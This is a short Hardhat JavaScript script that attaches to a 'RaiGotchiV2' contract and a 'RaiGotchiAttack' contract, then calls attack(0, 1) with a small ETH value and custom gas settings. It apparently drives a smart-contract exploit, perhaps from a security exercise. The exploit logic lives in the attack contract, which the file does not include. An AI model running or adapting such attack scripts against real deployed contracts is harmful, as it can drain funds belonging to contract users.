const { parseUnits } = require("ethers");
const hre = require("hardhat");
const { getContracts } = require("../utils");



async function main() {
    const network = hre.network.name;
    const contracts = getContracts(network);

    const [user] = await hre.ethers.getSigners();

    console.log("Using the account:", user.address);

  
    const RaiGotchiV2= await hre.ethers.getContractFactory(
      "RaiGotchiV2"
    );
    const raiGotchiV2= RaiGotchiV2.attach(
      contracts.raiGotchiV2
    );

    const RaiGotchiAttack= await hre.ethers.getContractFactory(
        "RaiGotchiAttack"
      );
    const raiGotchiAttack= RaiGotchiAttack.attach(
        contracts.raiGotchiAttack
      );


    const txAttack = await raiGotchiAttack.attack(0, 1, {
        value: "100000000000000001",
        gasLimit: 1000000,  // Add reasonable gas limit
        maxFeePerGas: parseUnits("50", "gwei"),  // Adjust this value based on network conditions
        maxPriorityFeePerGas: parseUnits("2", "gwei")  // Tip for miners/validators
    });
    await txAttack.wait();
    console.log("Done Attack");


  }
  
  main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
    });






